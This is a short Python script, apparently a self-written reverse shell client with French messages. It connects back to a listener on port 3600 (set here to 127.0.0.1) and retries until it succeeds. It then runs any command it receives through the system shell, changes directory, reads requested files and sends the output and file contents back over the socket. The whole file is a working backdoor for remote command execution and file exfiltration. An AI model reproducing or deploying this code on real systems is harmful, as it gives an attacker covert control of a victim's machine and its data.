import socket
import time
import subprocess
import platform
import os

PORT , HOST = 3600, "127.0.0.1"
MAX_SIZE = 1024

while True:
    try:
        s = socket.socket()
        s.connect((HOST, PORT))
    except:
        print('Erreur de connexion')
        time.sleep(4)
    else:
        print('connexion reissie')
        break

while True:
    cmd = s.recv(MAX_SIZE).decode()
    if cmd == 'fin':
        break
    
       
    if cmd =='info':
        reponse = str(HOST)+ str(PORT) + platform.platform() + os.getcwd()

    elif cmd[:2] == 'cd':

        dire = cmd[3:]
         
        if os.path.exists(dire) :  
            os.chdir(dire)
            reponse = os.getcwd()
        else:
            reponse = 'repertoire inexistant'
    
    elif cmd[:2] == 'fl':
        fichier = cmd[3:]
        try:
            f = open(fichier, 'rb')
        except FileNotFoundError :
            reponse = " ".encode()
        else:
            reponse = f.read().decode()
            f.close()

    else:
        resultat = subprocess.run(cmd, shell=True, capture_output=True, universal_newlines=True)
        reponse = resultat.stdout + resultat.stderr

    
    if not reponse or len(reponse)==0:
        reponse = " "
    reponse = reponse.encode()


    data_len = str(len(reponse)).zfill(13)
    print(f'la longueur est {data_len}\n')
    s.sendall(data_len.encode())
    s.sendall(reponse)

s.close()